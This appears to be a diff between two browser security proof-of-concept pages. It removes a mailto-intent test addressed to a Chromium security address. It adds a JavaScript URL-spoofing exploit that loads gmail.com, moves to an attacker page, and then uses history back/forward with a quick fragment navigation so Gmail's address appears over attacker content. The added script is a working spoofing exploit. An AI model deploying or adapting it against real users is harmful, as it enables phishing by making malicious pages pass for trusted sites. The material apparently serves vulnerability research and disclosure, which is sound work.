@@ -1,20 +1,20 @@
-<!DOCTYPE html>
-<html>
-<body>
+<script>
+var w = null;
+function spoof() {
+  w = window.open("about:blank");
 
-<input type="button" value="Click Call Center (Mailto)"
-onclick="
-setTimeout(function() {
-  location.href =
-  'mailto:securityfake@google.com' +
-  '?subject=POC%20Chrome%20Android%20UI%20Intent' +
-  '&body=Hello%20Chromium%20Security%20Team,%0A%0AThis%20email%20is%20opened%20via%20a%20mailto%20intent%20triggered%20from%20Chrome.%0A%0ARedirect%20happens%20after%20intent%20trigger.%0A%0ARegards,%0AQadhafy';
-}, 1700);
+  // Step 1: Load victim page.
+  w.location = "http://www.gmail.com";
 
-setTimeout(function() {
-  location.href = 'https://www.mozilla.org/en-US/security/';
-}, 200);
-">
+  // Step 2: Navigate to attacker's page.
+  setTimeout('w.location = "attacker.html"', 1000);
 
-</body>
-</html>
+  // Step 3: Go back.
+  setTimeout('w.history.back();', 2000);
+
+  // Step 4: Go forward, but interrupt with a quick fragment navigation.
+  setTimeout('w.history.forward(); setTimeout("w.location = \'http://www.gmail.com#URLspoof\'", 1);', 3000);
+}
+</script>
+
+<a href="javascript:spoof();">Click Me</a>
